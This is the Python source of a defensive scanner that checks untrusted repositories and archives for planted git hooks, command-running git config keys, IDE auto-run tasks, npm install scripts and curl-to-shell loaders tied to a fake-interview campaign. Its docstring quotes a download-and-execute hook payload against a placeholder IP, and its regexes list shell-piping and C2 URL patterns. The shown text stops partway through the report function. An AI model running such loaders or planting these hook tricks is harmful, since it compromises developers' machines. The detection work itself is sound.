#!/usr/bin/env python3
"""
hostile_repo_scan.py — Phase 0.0 "Hostile Repository Triage" scanner.

Detects code-execution traps planted in an untrusted repository or archive
BEFORE anyone runs git, a package manager, a build tool, or opens it in an IDE.
Built after a real DPRK "Contagious Interview" case: a take-home test was shipped
as a ZIP with a live .git/ folder, and its hooks did
    curl -sL 'http://<ip>:8080/task/mac?id=483' | bash
on every `git checkout` and `git commit`.

What it checks
  HR-HOOK      active (non-.sample) hooks inside .git/hooks, .git/modules/*/hooks
  HR-SAMPLE    trojanised or non-standard *.sample hook files (renamed-sample trick)
  HR-GITCFG    repo-local git config keys that execute commands
               (core.hooksPath, core.fsmonitor, core.sshCommand, filters, textconv, ...)
  HR-TRACKED   tracked hook folders (.githooks/, .husky/, githooks/) with payloads
  HR-IDE       IDE / devcontainer auto-run (VS Code tasks runOn:folderOpen,
               devcontainer initializeCommand/postCreateCommand)
  HR-PKG       package-manager lifecycle scripts that download or execute code
  HR-DLX       download-and-execute one-liners anywhere (curl|bash, iwr|iex, ...)
  HR-C2URL     URL shapes used by this campaign's loaders (/task/<os>?id=, ...)
  HR-IOC       known IOCs (IPs, domains, hashes) from references/iocs/*.json
  HR-RAWIP     hard-coded public raw-IP URLs
  HR-OBF       heavily obfuscated JavaScript
  HR-ARCHIVE   archive ships a .git/ directory (the only way hooks can travel)
  HR-ARTIFACT  operator artifacts (.git/cursor IDE index, foreign reflog identities)

Safety guarantees
  * Never executes anything from the target and never invokes git.
  * Archives (.zip, .tar, .tar.gz, .tgz) are read in memory, never extracted.
  * Symlinks are not followed.

Usage
  python ci/hostile_repo_scan.py <dir|archive> [--output report.json]
                                 [--iocs FILE ...] [--exclude GLOB ...] [--quiet]

Exit codes
  0 — no CRITICAL/HIGH findings
  1 — CRITICAL or HIGH findings (treat the target as hostile; do NOT run git)
  2 — scan error
"""

from __future__ import annotations

import argparse
import datetime as _dt
import fnmatch
import hashlib
import ipaddress
import json
import os
import re
import stat
import sys
import tarfile
import zipfile
from dataclasses import dataclass, field
from typing import Callable, Iterator

SCANNER_VERSION = "1.0.0"
MAX_CONTENT_BYTES = 2 * 1024 * 1024
SEVERITY_ORDER = ["critical", "high", "medium", "low", "info"]
SEVERITY_WEIGHT = {"critical": 25, "high": 10, "medium": 3, "low": 1, "info": 0}
ID_PREFIX = {"critical": "CRIT", "high": "HIGH", "medium": "MED", "low": "LOW", "info": "INFO"}

# Stock sample hooks shipped by `git init` (Git 2.x).
STOCK_SAMPLES = {
    "applypatch-msg.sample", "commit-msg.sample", "fsmonitor-watchman.sample",
    "post-update.sample", "pre-applypatch.sample", "pre-commit.sample",
    "pre-merge-commit.sample", "pre-push.sample", "pre-rebase.sample",
    "pre-receive.sample", "prepare-commit-msg.sample", "push-to-checkout.sample",
    "sendemail-validate.sample", "update.sample",
}

# Which user action fires which hook — used to explain impact.
HOOK_TRIGGERS = {
    "post-checkout": "every `git checkout` / `git switch` / `git clone` / `git worktree add`",
    "pre-commit": "every `git commit` (skipped only by --no-verify)",
    "post-commit": "every `git commit` (NOT skipped by --no-verify)",
    "prepare-commit-msg": "every `git commit` (NOT skipped by --no-verify)",
    "commit-msg": "every `git commit`",
    "pre-merge-commit": "`git merge` that auto-creates a merge commit",
    "post-merge": "every successful `git merge` / `git pull`",
    "pre-rebase": "every `git rebase`",
    "post-rewrite": "`git commit --amend` / `git rebase`",
    "pre-push": "every `git push`",
    "pre-auto-gc": "automatic `git gc`",
    "reference-transaction": "almost every ref update (checkout, commit, fetch)",
    "fsmonitor-watchman": "`git status` when core.fsmonitor points to it",
}

ATTACK_HOOK = ["T1204.002", "T1546", "T1059.004", "T1105"]

# ─── Detection patterns ──────────────────────────────────────────────────────

RE_DOWNLOADER = re.compile(
    r"\b(curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod|irm|certutil(\.exe)?\s+-urlcache"
    r"|bitsadmin|Net\.WebClient|DownloadString|fetch\s*\()", re.I)
RE_PIPE_EXEC = re.compile(
    r"\|\s*(sudo\s+)?(ba|z|da|k|fi)?sh\b|\|\s*(cmd(\.exe)?|powershell(\.exe)?|pwsh|python[0-9.]*"
    r"|node|perl|ruby|php|iex|Invoke-Expression|osascript)\b", re.I)
RE_SUBSHELL_EXEC = re.compile(
    r"\b((ba|z)?sh|python[0-9.]*|node)\s+-c\s+[\"']?\$\(\s*(curl|wget)\b"
    r"|\beval\s+[\"']?\$\(\s*(curl|wget)\b"
    r"|\bsource\s+<\(\s*(curl|wget)\b", re.I)
RE_B64_EXEC = re.compile(r"base64\s+(-d|-D|--decode)\b[^\n|]*\|\s*(ba|z)?sh\b", re.I)
RE_UNAME_SWITCH = re.compile(r"uname\s+-s", re.I)
RE_OS_LABELS = re.compile(r"\b(Darwin|MINGW|MSYS|CYGWIN)\b")
RE_BACKGROUND_SILENT = re.compile(r">\s*/dev/null\s+2>&1\s*&")

RE_C2_URL = [
    (re.compile(r"/task/(mac|linux|windows)\?(id|token)=", re.I), "'/task/<os>?id=' loader (CITIZENDOT / Prepaire / MMON variants)"),
    (re.compile(r"/task/(tokenlinux|parser)\?(id|st|token)=", re.I), "'/task/tokenlinux|parser' follow-on stage (OtterCookie chain)"),
    (re.compile(r"/settings/(mac|linux|windows)\?flag=\d+", re.I), "'/settings/<os>?flag=' Vercel loader"),
    (re.compile(r"vercel\.app/api/[mlw]\b", re.I), "'vercel.app/api/{m,l,w}' loader"),
    (re.compile(r"/30\d/30\d[mlw]\b"), "'/30x/30x{m,l,w}' loader"),
]

RE_RAW_IP_URL = re.compile(r"\b(?:https?|hxxps?|ftp)://(\d{1,3}(?:\.\d{1,3}){3})(?::\d{1,5})?", re.I)
RE_OBF_HEX_IDENT = re.compile(r"_0x[0-9a-f]{4,6}")
RE_EVAL_LIKE = re.compile(r"\b(eval|Function)\s*\(")

RE_VSCODE_FOLDEROPEN = re.compile(r"[\"']runOn[\"']\s*:\s*[\"']folderOpen[\"']")
DEVCONTAINER_KEYS = ("initializeCommand", "onCreateCommand", "updateContentCommand",
                     "postCreateCommand", "postStartCommand", "postAttachCommand")
PKG_LIFECYCLE = ("preinstall", "install", "postinstall", "prepare", "prepublish",
                 "prepack", "postpack", "preuninstall", "postuninstall")

# repo-local git config keys that run commands
GITCFG_EXEC_KEYS = [
    (re.compile(r"^core\.hookspath$"), "high", "redirects hooks to an attacker-chosen directory"),
    (re.compile(r"^core\.fsmonitor$"), "critical", "runs a program on `git status` and most porcelain commands"),
    (re.compile(r"^core\.sshcommand$"), "high", "runs a command on every fetch/push over SSH"),
    (re.compile(r"^core\.gitproxy$"), "high", "runs a proxy command for git:// transport"),
    (re.compile(r"^core\.(pager|editor|askpass)$"), "medium", "runs a command when git pages output / opens an editor"),
    (re.compile(r"^sequence\.editor$"), "medium", "runs a command during interactive rebase"),
    (re.compile(r"^credential(\..*)?\.helper$"), "medium", "runs a credential helper"),
    (re.compile(r"^filter\..+\.(clean|smudge|process)$"), "high", "runs a filter command on checkout/add"),
    (re.compile(r"^diff\..+\.(textconv|command)$"), "high", "runs a command on `git diff` / `git log -p`"),
    (re.compile(r"^merge\..+\.driver$"), "high", "runs a merge driver on `git merge`"),
    (re.compile(r"^uploadpack\.packobjectshook$"), "high", "runs a hook on upload-pack"),
    (re.compile(r"^include(if\..+)?\.path$"), "medium", "includes another config file (can hide the keys above)"),
    (re.compile(r"^alias\..+$"), "low", "shell alias"),
]
BENIGN_GITCFG_VALUES = re.compile(r"^(git-lfs\b|true$|false$|less\b|vim?\b|nano\b|code\s+--wait|osxkeychain$|manager(-core)?$|cache\b|store$)", re.I)

TEXT_EXT_SKIP = {
    ".png", ".jpg", ".jpeg", ".gif", ".ico", ".pdf", ".zip", ".gz", ".tgz", ".jar",
    ".woff", ".woff2", ".ttf", ".otf", ".mp4", ".mp3", ".mov", ".bin", ".pack", ".idx",
    ".so", ".dylib", ".dll", ".exe", ".class", ".pyc", ".wasm",
}
SKIP_DIR_PARTS = {"node_modules", ".venv", "venv", "__pycache__"}


# ─── Data model ──────────────────────────────────────────────────────────────

@dataclass
class Entry:
    path: str                      # posix relpath inside target
    mode: int | None               # unix mode if known
    size: int
    reader: Callable[[], bytes]
    is_symlink: bool = False

    @property
    def executable(self) -> str:
        if self.mode is None:
            return "unknown"
        return "yes" if self.mode & 0o111 else "no"


@dataclass
class Finding:
    severity: str
    check: str
    category: str
    cwe: str
    file: str
    line: int | None
    description: str
    evidence: str
    remediation: str
    attack: list[str] = field(default_factory=list)
    extra: dict = field(default_factory=dict)


# ─── Target enumeration (never extracts, never follows symlinks) ─────────────

def _norm(p: str) -> str:
    p = p.replace("\\", "/")
    while p.startswith("./"):
        p = p[2:]
    return p.lstrip("/")


def iter_directory(root: str) -> Iterator[Entry]:
    root = os.path.abspath(root)
    for dirpath, dirnames, filenames in os.walk(root, followlinks=False):
        rel_dir = os.path.relpath(dirpath, root)
        parts = set(rel_dir.replace("\\", "/").split("/"))
        # never descend into object store or dependency trees
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIR_PARTS
                       and not (d == "objects" and dirpath.endswith(os.sep + ".git"))]
        if parts & SKIP_DIR_PARTS:
            continue
        for name in filenames:
            full = os.path.join(dirpath, name)
            try:
                st = os.lstat(full)
            except OSError:
                continue
            rel = _norm(os.path.relpath(full, root))
            if stat.S_ISLNK(st.st_mode):
                yield Entry(rel, st.st_mode, 0, lambda: b"", is_symlink=True)
                continue
            if not stat.S_ISREG(st.st_mode):
                continue
            yield Entry(rel, st.st_mode, st.st_size,
                        (lambda f=full: _read_file(f)))


def _read_file(path: str) -> bytes:
    with open(path, "rb") as fh:
        return fh.read(MAX_CONTENT_BYTES)


def iter_zip(path: str) -> Iterator[Entry]:
    zf = zipfile.ZipFile(path)
    for info in zf.infolist():
        if info.is_dir():
            continue
        mode = (info.external_attr >> 16) & 0xFFFF or None
        is_link = bool(mode and stat.S_ISLNK(mode))
        name = _norm(info.filename)
        if any(part in SKIP_DIR_PARTS for part in name.split("/")) or "/.git/objects/" in f"/{name}":
            continue
        yield Entry(name, mode, info.file_size,
                    (lambda i=info: zf.open(i).read(MAX_CONTENT_BYTES)), is_symlink=is_link)


def iter_tar(path: str) -> Iterator[Entry]:
    tf = tarfile.open(path, "r:*")
    for m in tf.getmembers():
        name = _norm(m.name)
        if any(part in SKIP_DIR_PARTS for part in name.split("/")) or "/.git/objects/" in f"/{name}":
            continue
        if m.issym() or m.islnk():
            yield Entry(name, m.mode, 0, lambda: b"", is_symlink=True)
            continue
        if not m.isfile():
            continue

        def _r(member=m):
            fh = tf.extractfile(member)
            return fh.read(MAX_CONTENT_BYTES) if fh else b""
        yield Entry(name, m.mode, m.size, _r)


def enumerate_target(target: str) -> tuple[str, Iterator[Entry]]:
    if os.path.isdir(target):
        return "directory", iter_directory(target)
    low = target.lower()
    if zipfile.is_zipfile(target):
        return "zip", iter_zip(target)
    if low.endswith((".tar", ".tar.gz", ".tgz", ".tar.bz2", ".tar.xz")) or tarfile.is_tarfile(target):
        return "tar", iter_tar(target)
    raise ValueError(f"unsupported target (not a directory, zip or tar): {target}")


# ─── Helpers ─────────────────────────────────────────────────────────────────

def defang(text: str) -> str:
    text = re.sub(r"\bhttp(s?)://", r"hxxp\1://", text, flags=re.I)
    return re.sub(r"\b(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\b", r"\1[.]\2[.]\3[.]\4", text)


def snippet(line: str, limit: int = 220) -> str:
    line = line.strip()
    return defang(line if len(line) <= limit else line[:limit] + "…")


def decode(data: bytes) -> str | None:
    if b"\x00" in data[:8192]:
        return None
    try:
        return data.decode("utf-8")
    except UnicodeDecodeError:
        return data.decode("latin-1")


def is_public_ip(ip: str) -> bool:
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return not (addr.is_private or addr.is_loopback or addr.is_link_local
                or addr.is_reserved or addr.is_multicast or addr.is_unspecified)


RE_INLINE_PROGRAM = re.compile(r"^\s*(python[0-9.]*|node|perl|ruby|php)\s+-(c|e)\b", re.I)


RE_QUOTED = re.compile(r"'[^']*'|\"[^\"]*\"")


def _pipe_exec_in(fragment: str) -> bool:
    for m in RE_PIPE_EXEC.finditer(fragment):
        if RE_INLINE_PROGRAM.match(fragment[m.start() + 1:]):
            continue  # `| python3 -c '...json...'` only parses data
        return True
    return False


def _pipes_into_interpreter(line: str) -> bool:
    """True if the line pipes downloaded content into an interpreter.

    Quote-aware: `grep -E 'curl|wget|python'` is regex alternation, not a pipe.
    Quoted text still counts when it is itself a command line (contains a
    downloader, a URL and a spaced pipe), e.g. `sh -c "curl http://x | sh"`."""
    unquoted = RE_QUOTED.sub("''", line)
    if RE_DOWNLOADER.search(unquoted) and _pipe_exec_in(unquoted):
        return True
    for q in RE_QUOTED.findall(line):
        inner = q[1:-1]
        if "://" in inner and RE_DOWNLOADER.search(inner) and re.search(r"\s\|\s*\S", inner) and _pipe_exec_in(inner):
            return True
    return False


def dlx_hits(text: str) -> list[tuple[int, str, str]]:
    """Return (line_no, kind, line) for download-and-execute constructs."""
    hits = []
    for no, line in enumerate(text.splitlines(), 1):
        if RE_SUBSHELL_EXEC.search(line):
            hits.append((no, "subshell-exec", line))
        elif RE_DOWNLOADER.search(line) and _pipes_into_interpreter(line):
            hits.append((no, "pipe-to-interpreter", line))
        elif RE_B64_EXEC.search(line):
            hits.append((no, "base64-to-shell", line))
    return hits


def hook_dir_kind(path: str) -> str | None:
    """Classify a path as a git hook location; returns 'gitdir' | 'tracked' | None."""
    p = "/" + path
    if re.search(r"/\.git/(modules/.+/)?hooks/[^/]+$", p) or re.search(r"/\.git/worktrees/[^/]+/hooks/[^/]+$", p):
        return "gitdir"
    if re.search(r"/(\.githooks|githooks|\.git-hooks|\.husky|\.config/git/hooks)/[^/]+$", p):
        return "tracked"
    return None


def parse_git_config(text: str) -> list[tuple[int, str, str]]:
    """Minimal git-config parser → [(line, 'section.sub.key', value)]."""
    out, section = [], ""
    for no, raw in enumerate(text.splitlines(), 1):
        line = raw.strip()
        if not line or line.startswith(("#", ";")):
            continue
        m = re.match(r'^\[\s*([A-Za-z0-9.-]+)(?:\s+"(.*)")?\s*\]', line)
        if m:
            section = m.group(1).lower() + (f".{m.group(2)}" if m.group(2) is not None else "")
            continue
        m = re.match(r"^([A-Za-z0-9-]+)\s*(?:=\s*(.*))?$", line)
        if m and section:
            out.append((no, f"{section}.{m.group(1).lower()}", (m.group(2) or "true").strip().strip('"')))
    return out


def load_iocs(paths: list[str]) -> dict:
    iocs = {"ips": {}, "domains": {}, "sha256": {}, "strings": {}}
    for p in paths:
        try:
            with open(p, encoding="utf-8") as fh:
                data = json.load(fh)
        except (OSError, json.JSONDecodeError):
            continue
        for kind in iocs:
            for item in data.get(kind, []):
                value = item["value"] if isinstance(item, dict) else item
                note = item.get("note", "") if isinstance(item, dict) else ""
                iocs[kind][value.lower() if kind != "strings" else value] = note
    return iocs


# ─── Scanner ─────────────────────────────────────────────────────────────────

class Scanner:
    def __init__(self, target: str, iocs: dict, excludes: list[str]):
        self.target = target
        self.iocs = iocs
        self.excludes = excludes
        self.findings: list[Finding] = []
        self.files_scanned = 0
        self.target_kind = ""
        self.has_gitdir = False
        self.active_hooks: list[str] = []

    def add(self, **kw) -> None:
        self.findings.append(Finding(**kw))

    def excluded(self, path: str) -> bool:
        return any(fnmatch.fnmatch(path, g) or fnmatch.fnmatch("/" + path, g) for g in self.excludes)

    def run(self) -> None:
        self.target_kind, entries = enumerate_target(self.target)
        for e in entries:
            if self.excluded(e.path):
                continue
            self.files_scanned += 1
            if "/.git/" in "/" + e.path or e.path.startswith(".git/"):
                self.has_gitdir = True
            try:
                self.scan_entry(e)
            except Exception as exc:  # keep scanning; one bad member must not hide others
                self.add(severity="info", check="HR-ERROR", category="scan_error", cwe="",
                         file=e.path, line=None, description=f"could not scan entry: {exc}",
                         evidence="", remediation="Inspect manually.")
        self.archive_level()

    # -- per entry ---------------------------------------------------------
    def scan_entry(self, e: Entry) -> None:
        name = e.path.rsplit("/", 1)[-1]
        kind = hook_dir_kind(e.path)
        ext = os.path.splitext(name)[1].lower()
        data = b"" if e.is_symlink else e.reader()
        sha256 = hashlib.sha256(data).hexdigest() if data else ""
        text = decode(data) if data and ext not in TEXT_EXT_SKIP else None

        if sha256 and sha256 in self.iocs["sha256"]:
            self.add(severity="critical", check="HR-IOC", category="known_malware_hash", cwe="CWE-506",
                     file=e.path, line=None,
                     description=f"File SHA-256 matches a known IOC ({self.iocs['sha256'][sha256] or 'listed'}).",
                     evidence=sha256, remediation="Treat target as malicious. Do not run git or any tooling in it.",
                     attack=ATTACK_HOOK)

        if kind == "gitdir":
            self.check_gitdir_hook(e, name, text)
        elif kind == "tracked":
            self.check_tracked_hook(e, name, text)

        if e.is_symlink and kind:
            self.add(severity="high", check="HR-HOOK", category="hook_symlink", cwe="CWE-59",
                     file=e.path, line=None,
                     description="Hook is a symlink — it can point at a script elsewhere in the tree.",
                     evidence="symlink", remediation="Remove the symlink; inspect its target as text.",
                     attack=ATTACK_HOOK)

        if re.search(r"(^|/)\.git/(modules/[^/]+/)?config$", e.path) or name == ".gitmodules":
            if text:
                self.check_git_config(e, text)
        if re.search(r"(^|/)\.git/cursor/", e.path) and name == "metadata.json":
            self.add(severity="info", check="HR-ARTIFACT", category="operator_artifact", cwe="",
                     file=e.path, line=None,
                     description="Cursor IDE index inside .git/ — the archive was produced from the sender's working copy.",
                     evidence="", remediation="Attribution artifact; preserve for investigation.")
        if re.search(r"(^|/)\.git/logs/HEAD$", e.path) and text:
            idents = sorted({m.group(1).strip() for m in re.finditer(r"[0-9a-f]{40} [0-9a-f]{40} (.+?) <", text)})
            if idents:
                self.add(severity="info", check="HR-ARTIFACT", category="operator_artifact", cwe="",
                         file=e.path, line=None,
                         description="Reflog shipped with the repo; it records the sender's local identities.",
                         evidence=", ".join(idents)[:220],
                         remediation="Record identities as attribution IOCs.")

        if text is None:
            return
        if name == "tasks.json" and "/.vscode/" in "/" + e.path:
            self.check_vscode_tasks(e, text)
        if name in ("devcontainer.json", ".devcontainer.json"):
            self.check_devcontainer(e, text)
        if name == "package.json":
            self.check_package_json(e, text)
        if name == "setup.py":
            self.check_setup_py(e, text)
        # Inside .git/ only the targeted checks above apply (hooks, config, artifacts):
        # commit messages, reflogs and descriptions are metadata, not executable content.
        in_gitdir = e.path.startswith(".git/") or "/.git/" in "/" + e.path
        if kind is None and not in_gitdir:
            self.check_generic(e, text)

    # -- hooks -------------------------------------------------------------
    def _hook_payload_findings(self, e: Entry, text: str) -> list[tuple[int, str, str]]:
        hits = dlx_hits(text)
        for rx, label in RE_C2_URL:
            for no, line in enumerate(text.splitlines(), 1):
                if rx.search(line):
                    hits.append((no, f"c2-url: {label}", line))
        if RE_UNAME_SWITCH.search(text) and RE_OS_LABELS.search(text) and RE_DOWNLOADER.search(text):
            hits.append((1, "os-switch dropper (uname -s → per-OS payload)", text.splitlines()[0] if text else ""))
        return hits

    def check_gitdir_hook(self, e: Entry, name: str, text: str | None) -> None:
        trigger = HOOK_TRIGGERS.get(name.split(".")[0], "the matching git operation")
        if name.endswith(".sample"):
            if text and self._hook_payload_findings(e, text):
                self.add(severity="critical", check="HR-SAMPLE", category="trojanized_sample_hook", cwe="CWE-506",
                         file=e.path, line=None,
                         description="A *.sample hook contains a downloader. Attackers hide payloads in samples and "
                                     "call them from an active hook, or rename them to activate later.",
                         evidence=snippet(self._hook_payload_findings(e, text)[0][2]),
                         remediation="Do not run git. Delete .git/hooks/* (or the whole .git) before any inspection.",
                         attack=ATTACK_HOOK)
            elif name not in STOCK_SAMPLES:
                self.add(severity="medium", check="HR-SAMPLE", category="nonstandard_sample_hook", cwe="CWE-506",
                         file=e.path, line=None,
                         description=f"'{name}' is not a stock Git sample (seen in the renamed-sample variant of this campaign).",
                         evidence=f"executable={e.executable}", remediation="Read it as text; delete if unexplained.",
                         attack=ATTACK_HOOK)
            return

        self.active_hooks.append(e.path)
        payload = self._hook_payload_findings(e, text) if text else []
        ioc = self._ioc_hits(text) if text else []
        if payload or ioc:
            first = (payload or ioc)[0]
            self.add(severity="critical", check="HR-HOOK", category="malicious_git_hook", cwe="CWE-506",
                     file=e.path, line=first[0],
                     description=(f"Active git hook '{name}' downloads and executes remote code. Fires on {trigger}. "
                                  f"Executable bit: {e.executable} (git ignores non-executable hooks). "
                                  f"Indicators: {', '.join(sorted({k for _, k, _ in payload + ioc}))}."),
                     evidence=snippet(first[2]),
                     remediation=("STOP — the repository is hostile. Do not run git/IDE/package tools in it. "
                                  "If any git command already ran here, start incident response "
                                  "(references/hostile-repo-playbook.md)."),
                     attack=ATTACK_HOOK,
                     extra={"executable": e.executable, "trigger": trigger})
        else:
            self.add(severity="high", check="HR-HOOK", category="active_git_hook_in_untrusted_repo", cwe="CWE-829",
                     file=e.path, line=None,
                     description=(f"Active git hook '{name}' shipped inside the repository (fires on {trigger}). "
                                  "Hooks never travel via `git clone`; shipping them is a strong hostility signal."),
                     evidence=snippet((text or "").splitlines()[0] if text else "binary/empty"),
                     remediation="Read it as text. Run git only as `git -c core.hooksPath=/dev/null ...` or delete .git/hooks/*.",
                     attack=ATTACK_HOOK, extra={"executable": e.executable, "trigger": trigger})

    def check_tracked_hook(self, e: Entry, name: str, text: str | None) -> None:
        if not text:
            return
        payload = self._hook_payload_findings(e, text) + self._ioc_hits(text)
        if payload:
            self.add(severity="critical", check="HR-TRACKED", category="malicious_tracked_hook", cwe="CWE-506",
                     file=e.path, line=payload[0][0],
                     description=("Tracked hook script contains a downloader. It becomes live when the README/setup "
                                  "asks you to run `git config core.hooksPath ...`, `husky install`, or `npm install`."),
                     evidence=snippet(payload[0][2]),
                     remediation="Never enable core.hooksPath / husky for untrusted repos.",
                     attack=ATTACK_HOOK)

    # -- git config --------------------------------------------------------
    def check_git_config(self, e: Entry, text: str) -> None:
        for no, key, value in parse_git_config(text):
            for rx, sev, why in GITCFG_EXEC_KEYS:
                if not rx.match(key):
                    continue
                if key.startswith("alias.") and not value.startswith("!"):
                    break
                if key.startswith("filter.lfs.") and value.startswith("git-lfs"):
                    break
                if sev in ("medium", "low") and BENIGN_GITCFG_VALUES.match(value):
                    break
                if key == "core.fsmonitor" and value.lower() in ("true", "false"):
                    break
                bad = bool(dlx_hits(value) or RE_DOWNLOADER.search(value))
                self.add(severity="critical" if bad else sev, check="HR-GITCFG", category="git_config_exec", cwe="CWE-829",
                         file=e.path, line=no,
                         description=f"Repo-local git config `{key}` {why}.",
                         evidence=snippet(f"{key} = {value}"),
                         remediation="Remove the key or run git with `-c <key>=` overrides; never trust shipped .git/config.",
                         attack=["T1546", "T1059.004"])
                break

    # -- IDE / package managers -------------------------------------------
    def check_vscode_tasks(self, e: Entry, text: str) -> None:
        for no, line in enumerate(text.splitlines(), 1):
            if RE_VSCODE_FOLDEROPEN.search(line):
                bad = bool(dlx_hits(text) or self._ioc_hits(text))
                self.add(severity="critical" if bad else "high", check="HR-IDE", category="ide_autorun_task", cwe="CWE-829",
                         file=e.path, line=no,
                         description="VS Code/Cursor task runs automatically when the folder is opened (runOn: folderOpen). "
                                     "Cursor ships with Workspace Trust disabled.",
                         evidence=snippet(line),
                         remediation="Open untrusted folders in Restricted Mode; set task.allowAutomaticTasks=off.",
                         attack=["T1204.002", "T1059"])

    def check_devcontainer(self, e: Entry, text: str) -> None:
        for no, line in enumerate(text.splitlines(), 1):
            for key in DEVCONTAINER_KEYS:
                if f'"{key}"' in line:
                    bad = bool(dlx_hits(line) or RE_DOWNLOADER.search(line))
                    sev = "critical" if bad else ("medium" if key == "initializeCommand" else "low")
                    self.add(severity=sev, check="HR-IDE", category="devcontainer_command", cwe="CWE-829",
                             file=e.path, line=no,
                             description=f"devcontainer `{key}` runs automatically"
                                         + (" on the HOST before the container starts." if key == "initializeCommand" else "."),
                             evidence=snippet(line), remediation="Review before 'Reopen in Container'.",
                             attack=["T1204.002"])

    def check_package_json(self, e: Entry, text: str) -> None:
        try:
            scripts = (json.loads(text) or {}).get("scripts", {}) or {}
        except (json.JSONDecodeError, AttributeError):
            return
        for hook in PKG_LIFECYCLE:
            cmd = scripts.get(hook)
            if not isinstance(cmd, str):
                continue
            bad = bool(dlx_hits(cmd) or RE_DOWNLOADER.search(cmd) or self._ioc_hits(cmd)
                       or re.search(r"node\s+-e\b|\beval\b|base64", cmd))
            if bad:
                self.add(severity="critical", check="HR-PKG", category="malicious_lifecycle_script", cwe="CWE-506",
                         file=e.path, line=None,
                         description=f"npm lifecycle script `{hook}` downloads/evaluates code — runs on `npm install`.",
                         evidence=snippet(cmd), remediation="Install with `npm ci --ignore-scripts` only after review.",
                         attack=["T1195.001", "T1059.007"])
            elif hook in ("preinstall", "install", "postinstall"):
                self.add(severity="low", check="HR-PKG", category="lifecycle_script_present", cwe="CWE-829",
                         file=e.path, line=None,
                         description=f"npm lifecycle script `{hook}` runs automatically on install; review the file it calls.",
                         evidence=snippet(cmd), remediation="Use `--ignore-scripts` until reviewed.",
                         attack=["T1059.007"])

    def check_setup_py(self, e: Entry, text: str) -> None:
        if re.search(r"\b(urllib|requests|socket|subprocess|os\.system|exec\(|eval\(|base64)\b", text) and \
                re.search(r"cmdclass|install\b", text):
            self.add(severity="high", check="HR-PKG", category="setup_py_side_effects", cwe="CWE-829",
                     file=e.path, line=None,
                     description="setup.py performs network/exec operations — runs on `pip install .`.",
                     evidence="", remediation="Review before installing; prefer wheels / isolated VM.",
                     attack=["T1195.001", "T1059.006"])

    # -- generic content ---------------------------------------------------
    def _ioc_hits(self, text: str) -> list[tuple[int, str, str]]:
        hits, low = [], text.lower()
        for kind in ("ips", "domains", "strings"):
            for value, note in self.iocs[kind].items():
                needle = value if kind == "strings" else value.lower()
                hay = text if kind == "strings" else low
                if needle and needle in hay:
                    for no, line in enumerate(text.splitlines(), 1):
                        if needle in (line if kind == "strings" else line.lower()):
                            hits.append((no, f"ioc:{value} {('— ' + note) if note else ''}".strip(), line))
                            break
        return hits

    def check_generic(self, e: Entry, text: str) -> None:
        is_doc = e.path.lower().endswith((".md", ".rst", ".txt", ".adoc", ".html"))
        for no, kind, line in dlx_hits(text):
            self.add(severity="low" if is_doc else "high", check="HR-DLX", category="download_and_execute", cwe="CWE-494",
                     file=e.path, line=no,
                     description=(f"Documentation tells the reader to run a download-and-execute one-liner ({kind}). "
                                  "Check that the host is the official vendor." if is_doc else
                                  f"Download-and-execute construct ({kind}) in an executable/config file."),
                     evidence=snippet(line), remediation="Never pipe remote content into an interpreter; download, verify, then run.",
                     attack=["T1105", "T1059"])
        for rx, label in RE_C2_URL:
            for no, line in enumerate(text.splitlines(), 1):
                if rx.search(line):
                    self.add(severity="critical", check="HR-C2URL", category="campaign_loader_url", cwe="CWE-506",
                             file=e.path, line=no, description=f"URL matches a known DPRK fake-interview loader shape: {label}.",
                             evidence=snippet(line), remediation="Block the host; treat the repository as hostile.",
                             attack=["T1105", "T1071.001"])
        for no, ioc_kind, line in self._ioc_hits(text):
            self.add(severity="critical", check="HR-IOC", category="known_ioc", cwe="CWE-506",
                     file=e.path, line=no, description=f"Known IOC present ({ioc_kind}).",
                     evidence=snippet(line), remediation="Treat target as malicious; see playbook.",
                     attack=["T1071.001"])
        seen = set()
        for no, line in enumerate(text.splitlines(), 1):
            for m in RE_RAW_IP_URL.finditer(line):
                ip = m.group(1)
                if ip in seen or not is_public_ip(ip) or ip.lower() in self.iocs["ips"]:
                    continue
                seen.add(ip)
                self.add(severity="medium", check="HR-RAWIP", category="raw_ip_url", cwe="CWE-494",
                         file=e.path, line=no, description="Hard-coded public raw-IP URL (common for throwaway C2/staging).",
                         evidence=snippet(line), remediation="Verify ownership of the address; prefer named, TLS endpoints.",
                         attack=["T1071.001"])
        if e.path.endswith((".js", ".cjs", ".mjs", ".ts")):
            hex_ids = len(RE_OBF_HEX_IDENT.findall(text))
            long_eval = any(len(l) > 5000 and RE_EVAL_LIKE.search(l) for l in text.splitlines())
            if hex_ids > 50 or long_eval:
                self.add(severity="high", check="HR-OBF", category="obfuscated_javascript", cwe="CWE-506",
                         file=e.path, line=None,
                         description=f"Heavily obfuscated JavaScript ({hex_ids} _0x identifiers"
                                     f"{', long eval/Function line' if long_eval else ''}) — typical of BeaverTail/OtterCookie loaders.",
                         evidence="", remediation="Do not run; deobfuscate in an isolated VM.",
                         attack=["T1027", "T1059.007"])

    # -- archive-level -----------------------------------------------------
    def archive_level(self) -> None:
        if self.target_kind in ("zip", "tar") and self.has_gitdir:
            sev = "high" if self.active_hooks else "medium"
            self.add(severity=sev, check="HR-ARCHIVE", category="archive_ships_gitdir", cwe="CWE-829",
                     file=os.path.basename(self.target), line=None,
                     description=("Archive contains a .git/ directory"
                                  + (f" with {len(self.active_hooks)} active hook(s)" if self.active_hooks else "")
                                  + ". `git clone` never transfers hooks or config — shipping .git is how this attack delivers them."),
                     evidence="", remediation="Inspect with `unzip -l` / `tar -tvf`; delete .git before opening, or use a disposable VM.",
                     attack=["T1204.002"])

    # -- report ------------------------------------------------------------
    def report(self) -> dict:
        self.findings.sort(key=lambda f: (SEVERITY_ORDER.index(f.severity), f.file, f.line or 0))
        counters = {s: 0 for s in SEVERITY_ORDER}
        out = []
        for f in self.findings:
            counters[f.severity] += 1
            out.append({
                "id": f"{ID_PREFIX[f.severity]}-{counters[f.severity]:03d}",
                "severity": f.severity, "check": f.check, "category": f.category, "cwe": f.cwe,
                "file": f.file, "line": f.line, "description": f.description,
                "vulnerable_code": f.evidence, "remediation": f.remediation,
                "mitre_attack": f.attack, "autofix_ready": False, "status": "open", **({"details": f.extra} if f.extra else {}),
            })
        raw = sum(SEVERITY_WEIGHT[s] * n for s, n in counters.items())
        score = min(raw, 100)
